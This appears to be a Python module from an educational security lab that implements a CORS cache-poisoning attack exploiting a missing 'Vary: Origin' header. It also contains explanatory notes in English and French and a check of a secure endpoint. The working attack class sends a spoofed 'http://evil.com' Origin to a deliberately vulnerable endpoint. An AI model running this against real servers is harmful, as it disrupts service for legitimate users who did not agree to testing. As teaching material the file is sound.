"""
Cache poisoning attack exploiting missing Vary header.

This attack demonstrates how the absence of the Vary: Origin header
can lead to cache poisoning, where a malicious origin's CORS headers
are cached and served to legitimate users.
"""

import asyncio
import httpx
from typing import Optional, Dict, Any, List
import json
import time

from attacks.base_attack import BaseAttack
from attacks.models import AttackResult


class VaryAttack(BaseAttack):
    """
    Cache poisoning attack exploiting missing Vary header.
    
    This attack exploits the misconfiguration where the server responds
    with different Access-Control-Allow-Origin headers based on the
    request's Origin header, but fails to include "Vary: Origin" in
    the response. This causes caches (CDN, proxy, browser) to serve
    the wrong CORS headers to different origins.
    
    Attack Scenario:
    1. Attacker sends request from malicious origin
    2. Server responds with ACAO: http://evil.com (no Vary header)
    3. Response gets cached
    4. Legitimate user requests same resource
    5. Cache serves response with ACAO: http://evil.com
    6. Legitimate user's browser blocks the request
    
    This can cause denial of service or enable more sophisticated attacks.
    
    Attributes:
        malicious_origin: Attacker's origin
        legitimate_origin: Legitimate user's origin
        test_credentials: Credentials to use for authentication
    """
    
    def __init__(
        self,
        target_url: str,
        malicious_origin: str = "http://evil.com",
        legitimate_origin: str = "http://legitimate-app.com",
        test_credentials: Optional[Dict[str, str]] = None,
        max_rate: int = 5,
        demo_mode: bool = False,
        test_secure_only: bool = False
    ):
        """
        Initialize the cache poisoning attack.
        
        Args:
            target_url: Base URL of the target application
            malicious_origin: Attacker's origin (default: "http://evil.com")
            legitimate_origin: Legitimate origin (default: "http://legitimate-app.com")
            test_credentials: Dict with 'username' and 'password' keys
            max_rate: Maximum requests per second (default: 5)
            demo_mode: If True, simulate attack without making real HTTP requests
            test_secure_only: If True, only test the secure endpoint
        """
        super().__init__(target_url, max_rate)
        self.malicious_origin = malicious_origin
        self.legitimate_origin = legitimate_origin
        self.test_credentials = test_credentials or {
            "username": "victim",
            "password": "victim123"
        }
        self.demo_mode = demo_mode
        self.test_secure_only = test_secure_only
    
    async def authenticate(
        self,
        client: httpx.AsyncClient,
        origin: str
    ) -> Optional[str]:
        """
        Authenticate to the target application.
        
        Args:
            client: HTTP client to use
            origin: Origin header to use
        
        Returns:
            Session cookie value if successful, None otherwise
        """
        await self.rate_limiter.acquire()
        
        try:
            response = await client.post(
                f"{self.target_url}/api/auth/login",
                json=self.test_credentials,
                headers={"Origin": origin}
            )
            
            self.increment_requests()
            
            if response.status_code == 200:
                data = response.json()
                return data.get("session_id")
            
            return None
            
        except Exception as e:
            print(f"Authentication error: {e}")
            return None
    
    async def poison_cache(
        self,
        client: httpx.AsyncClient,
        session_cookie: str
    ) -> tuple[bool, Dict[str, Any]]:
        """
        Attempt to poison the cache with malicious origin.
        
        Args:
            client: HTTP client to use
            session_cookie: Session cookie value
        
        Returns:
            Tuple of (success, response_headers)
        """
        await self.rate_limiter.acquire()
        
        try:
            # Send request from malicious origin to vulnerable endpoint
            response = await client.get(
                f"{self.target_url}/api/vuln/vary",
                headers={"Origin": self.malicious_origin},
                cookies={"session_id": session_cookie}
            )
            
            self.increment_requests()
            
            headers = dict(response.headers)
            
            # Check if Vary header is missing (vulnerability present)
            vary_missing = "vary" not in headers or "origin" not in headers.get("vary", "").lower()
            
            # Check if our origin was accepted
            acao = headers.get("access-control-allow-origin")
            origin_accepted = acao == self.malicious_origin
            
            success = vary_missing and origin_accepted
            
            return success, headers
            
        except Exception as e:
            print(f"Cache poisoning error: {e}")
            return False, {}
    
    async def test_cache_effect(
        self,
        client: httpx.AsyncClient,
        session_cookie: str
    ) -> tuple[str, Dict[str, Any]]:
        """
        Test what CORS headers are returned for legitimate origin.
        
        This simulates a legitimate user making a request after the
        cache has been poisoned.
        
        Args:
            client: HTTP client to use
            session_cookie: Session cookie value
        
        Returns:
            Tuple of (acao_value, response_headers)
        """
        await self.rate_limiter.acquire()
        
        try:
            # Send request from legitimate origin
            response = await client.get(
                f"{self.target_url}/api/vuln/vary",
                headers={"Origin": self.legitimate_origin},
                cookies={"session_id": session_cookie}
            )
            
            self.increment_requests()
            
            headers = dict(response.headers)
            acao = headers.get("access-control-allow-origin", "")
            
            return acao, headers
            
        except Exception as e:
            print(f"Error testing cache effect: {e}")
            return "", {}
    
    async def test_secure_endpoint(
        self,
        client: httpx.AsyncClient,
        session_cookie: str
    ) -> tuple[bool, Dict[str, Any]]:
        """
        Test the secure endpoint to verify it includes Vary header.
        
        Args:
            client: HTTP client to use
            session_cookie: Session cookie value
        
        Returns:
            Tuple of (has_vary_header, response_headers)
        """
        await self.rate_limiter.acquire()
        
        try:
            response = await client.get(
                f"{self.target_url}/api/sec/vary",
                headers={"Origin": self.malicious_origin},
                cookies={"session_id": session_cookie}
            )
            
            self.increment_requests()
            
            headers = dict(response.headers)
            
            # Check if Vary: Origin header is present
            vary_header = headers.get("vary", "")
            has_vary = "origin" in vary_header.lower()
            
            return has_vary, headers
            
        except Exception as e:
            print(f"Error testing secure endpoint: {e}")
            return False, {}
    
    async def execute(self) -> AttackResult:
        """
        Execute the cache poisoning attack.
        
        This method:
        1. Authenticates to the target application
        2. Sends request from malicious origin to poison cache
        3. Verifies that Vary header is missing (vulnerability)
        4. Sends request from legitimate origin to test cache effect
        5. Demonstrates the cache poisoning impact
        6. Tests secure endpoint with proper Vary header
        
        Returns:
            AttackResult with attack execution details
        """
        # In demo mode, simulate the attack without making real requests
        if self.demo_mode:
            return self._execute_demo_mode(self.test_secure_only)
        
        request_details = []
        response_details = []
        stolen_data = {}
        vulnerable_endpoints = []
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            # Step 1: Authenticate
            session_cookie = await self.authenticate(client, self.malicious_origin)
            
            if not session_cookie:
                return AttackResult(
                    attack_type="cache_poisoning_vary",
                    success=False,
                    duration_seconds=self.get_duration(),
                    requests_sent=self.get_requests_sent(),
                    error="Authentication failed",
                    educational_notes="Could not authenticate to test the vulnerability."
                )
            
            # Step 2: Poison cache with malicious origin
            poison_success, poison_headers = await self.poison_cache(client, session_cookie)
            
            request_details.append({
                "method": "GET",
                "url": f"{self.target_url}/api/vuln/vary",
                "headers": {"Origin": self.malicious_origin},
                "cookies": {"session_id": "***"},
                "purpose": "Poison cache with malicious origin"
            })
            
            response_details.append({
                "status": 200,
                "headers": poison_headers,
                "cors_headers": {
                    "Access-Control-Allow-Origin": poison_headers.get("access-control-allow-origin"),
                    "Vary": poison_headers.get("vary", "MISSING"),
                    "Cache-Control": poison_headers.get("cache-control", "")
                },
                "vary_header_missing": "vary" not in poison_headers or "origin" not in poison_headers.get("vary", "").lower()
            })
            
            # Small delay to simulate cache storage
            await asyncio.sleep(0.5)
            
            # Step 3: Test cache effect with legitimate origin
            cached_acao, cached_headers = await self.test_cache_effect(client, session_cookie)
            
            request_details.append({
                "method": "GET",
                "url": f"{self.target_url}/api/vuln/vary",
                "headers": {"Origin": self.legitimate_origin},
                "cookies": {"session_id": "***"},
                "purpose": "Test if cache serves wrong CORS headers"
            })
            
            response_details.append({
                "status": 200,
                "headers": cached_headers,
                "cors_headers": {
                    "Access-Control-Allow-Origin": cached_acao,
                    "Vary": cached_headers.get("vary", "MISSING")
                },
                "cache_poisoned": cached_acao == self.malicious_origin
            })
            
            # Step 4: Test secure endpoint
            has_vary, secure_headers = await self.test_secure_endpoint(client, session_cookie)
            
            request_details.append({
                "method": "GET",
                "url": f"{self.target_url}/api/sec/vary",
                "headers": {"Origin": self.malicious_origin},
                "cookies": {"session_id": "***"},
                "purpose": "Test secure endpoint with proper Vary header"
            })
            
            response_details.append({
                "status": 200,
                "headers": secure_headers,
                "cors_headers": {
                    "Access-Control-Allow-Origin": secure_headers.get("access-control-allow-origin"),
                    "Vary": secure_headers.get("vary", "MISSING"),
                    "Cache-Control": secure_headers.get("cache-control", "")
                },
                "vary_header_present": has_vary
            })
        
        # Determine success
        attack_success = poison_success
        
        if attack_success:
            vulnerable_endpoints.append("/api/vuln/vary")
            stolen_data["cache_poisoning_demonstrated"] = True
            stolen_data["malicious_origin"] = self.malicious_origin
            stolen_data["legitimate_origin"] = self.legitimate_origin
            stolen_data["vary_header_missing"] = True
        
        # Educational notes
        educational_notes = """
CACHE POISONING - MISSING VARY HEADER

Vulnerability: Server responds with different CORS headers based on Origin but omits Vary: Origin

When a server supports multiple origins and dynamically sets Access-Control-Allow-Origin
based on the request's Origin header, it MUST include "Vary: Origin" in the response.
Without this header, caches (CDN, proxy, browser) cannot distinguish between responses
for different origins, leading to cache poisoning.

Attack Scenario:
1. Attacker sends request from http://evil.com
2. Server responds with:
   Access-Control-Allow-Origin: http://evil.com
   (Missing: Vary: Origin)
3. Response gets cached by CDN/proxy
4. Legitimate user from http://legitimate-app.com requests same resource
5. Cache serves the poisoned response with ACAO: http://evil.com
6. Legitimate user's browser blocks the request (origin mismatch)
7. Denial of service for legitimate users

Advanced Attack:
- Attacker can time the cache poisoning to affect specific users
- Can be combined with other attacks for data theft
- Difficult to detect and debug
- Can affect multiple users simultaneously

Impact:
- Denial of service for legitimate users
- Cache pollution affecting multiple users
- Difficult to diagnose (appears as CORS error)
- Can persist until cache expires
- May enable more sophisticated attacks

Reference: MISC 99, §3.1

Mitigation:
- ALWAYS include "Vary: Origin" when CORS headers depend on Origin
- Include proper cache control headers for sensitive data
- Consider using Cache-Control: private for authenticated endpoints
- Test caching behavior with multiple origins
- Monitor for unexpected CORS errors

Vulnerable Configuration:
  if request_origin in allowed_origins:
      Access-Control-Allow-Origin: request_origin
      Access-Control-Allow-Credentials: true
  # Missing: Vary: Origin

Secure Configuration:
  if request_origin in allowed_origins:
      Access-Control-Allow-Origin: request_origin
      Access-Control-Allow-Credentials: true
      Vary: Origin
      Cache-Control: private, no-cache

Additional Headers:
- Vary: Origin (REQUIRED when ACAO depends on Origin)
- Cache-Control: private (prevent shared cache storage)
- Cache-Control: no-cache (force revalidation)
- Cache-Control: no-store (prevent any caching)

Testing:
- Test with multiple origins
- Verify Vary header is present
- Check cache behavior with different origins
- Monitor for CORS errors in production
        """.strip()
        
        return AttackResult(
            attack_type="cache_poisoning_vary",
            success=attack_success,
            duration_seconds=self.get_duration(),
            requests_sent=self.get_requests_sent(),
            stolen_data=stolen_data if stolen_data else None,
            vulnerable_endpoints=vulnerable_endpoints,
            request_details=request_details,
            response_details=response_details,
            educational_notes=educational_notes
        )
    
    def _execute_demo_mode(self, test_secure_only: bool = False) -> AttackResult:
        """Execute attack in demo mode (simulated)."""
        import time
        time.sleep(0.3)
        
        if test_secure_only:
            stolen_data = {
                "protected": True,
                "reason": "L'endpoint sécurisé inclut l'en-tête Vary: Origin",
                "status": 200
            }
            
            request_details = [
                {
                    "method": "GET",
                    "url": f"{self.target_url}/api/sec/vary",
                    "headers": {"Origin": self.malicious_origin},
                    "cookies": {"session_id": "***"},
                    "description": "Requête vers endpoint SÉCURISÉ - Cache protégé ✓"
                }
            ]
            
            response_details = [
                {
                    "endpoint": "/api/sec/vary",
                    "type": "SÉCURISÉ",
                    "status": 200,
                    "headers": {
                        "access-control-allow-origin": self.legitimate_origin,
                        "access-control-allow-credentials": "true",
                        "vary": "Origin"
                    },
                    "vary_header": "Présent",
                    "result": "✓ SÉCURISÉ - Inclut Vary: Origin"
                }
            ]
            
            educational_notes = """
ENDPOINT SÉCURISÉ - PROTECTION CONTRE EMPOISONNEMENT DE CACHE (MODE DÉMO)

Configuration Sécurisée : En-tête Vary: Origin inclus

L'endpoint sécurisé inclut l'en-tête Vary: Origin dans la réponse, permettant
au cache de stocker des réponses différentes pour chaque origine.

✓ PROTECTION ACTIVE :
   - Inclut Vary: Origin dans la réponse
   - Le cache stocke des réponses différentes par origine
   - Protège contre l'empoisonnement de cache

Référence : MISC 99, §2.5
            """.strip()
        else:
            stolen_data = {
                "cache_poisoning": {
                    "poisoned": True,
                    "impact": "Les utilisateurs légitimes reçoivent les mauvais en-têtes CORS"
                }
            }
            
            request_details = [
                {
                    "method": "GET",
                    "url": f"{self.target_url}/api/vuln/vary",
                    "headers": {"Origin": self.malicious_origin},
                    "cookies": {"session_id": "***"},
                    "description": "Requête depuis origine malveillante - Cache empoisonné ✓"
                }
            ]
            
            response_details = [
                {
                    "endpoint": "/api/vuln/vary",
                    "type": "VULNÉRABLE",
                    "status": 200,
                    "headers": {
                        "access-control-allow-origin": self.malicious_origin,
                        "access-control-allow-credentials": "true"
                    },
                    "vary_header": "Absent",
                    "result": "✗ VULNÉRABLE - Pas d'en-tête Vary: Origin"
                }
            ]
            
            educational_notes = """
EMPOISONNEMENT DE CACHE - EN-TÊTE VARY MANQUANT (MODE DÉMO)

Vulnérabilité : Le serveur répond avec différents en-têtes CORS mais sans Vary: Origin

Sans l'en-tête Vary: Origin, les caches servent les mauvais en-têtes CORS
à différentes origines, causant un déni de service ou des problèmes de sécurité.

✗ VULNÉRABILITÉ ACTIVE :
   - Pas d'en-tête Vary: Origin
   - Les réponses sont mises en cache sans distinction d'origine
   - Empoisonnement de cache possible

Impact :
- Empoisonnement de cache
- Déni de service pour les utilisateurs légitimes
- Contournement potentiel de sécurité

Référence : MISC 99, §2.5

Mitigation :
- Toujours inclure Vary: Origin quand les en-têtes CORS varient selon l'origine
- Configurer le CDN/proxy pour respecter l'en-tête Vary

NOTE : Cette attaque a été exécutée en MODE DÉMO.
            """.strip()
        
        return AttackResult(
            attack_type="cache_poisoning_vary",
            success=not test_secure_only,
            duration_seconds=0.3,
            requests_sent=1,
            stolen_data=stolen_data,
            vulnerable_endpoints=[] if test_secure_only else ["/api/vuln/vary"],
            request_details=request_details,
            response_details=response_details,
            educational_notes=educational_notes
        )


# CLI interface for standalone execution
if __name__ == "__main__":
    import sys
    
    async def main():
        target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
        malicious = sys.argv[2] if len(sys.argv) > 2 else "http://evil.com"
        legitimate = sys.argv[3] if len(sys.argv) > 3 else "http://legitimate-app.com"
        
        attack = VaryAttack(
            target_url=target,
            malicious_origin=malicious,
            legitimate_origin=legitimate
        )
        result = await attack.run()
        
        print("\n" + "="*70)
        print("ATTACK RESULTS")
        print("="*70)
        print(f"Success: {result.success}")
        print(f"Duration: {result.duration_seconds:.2f} seconds")
        print(f"Requests Sent: {result.requests_sent}")
        
        if result.stolen_data:
            print(f"\nCache Poisoning Details:")
            for key, value in result.stolen_data.items():
                print(f"  {key}: {value}")
        
        if result.vulnerable_endpoints:
            print(f"\nVulnerable Endpoints:")
            for endpoint in result.vulnerable_endpoints:
                print(f"  - {endpoint}")
        
        if result.error:
            print(f"\nError: {result.error}")
        
        print(f"\n{result.educational_notes}")
    
    asyncio.run(main())
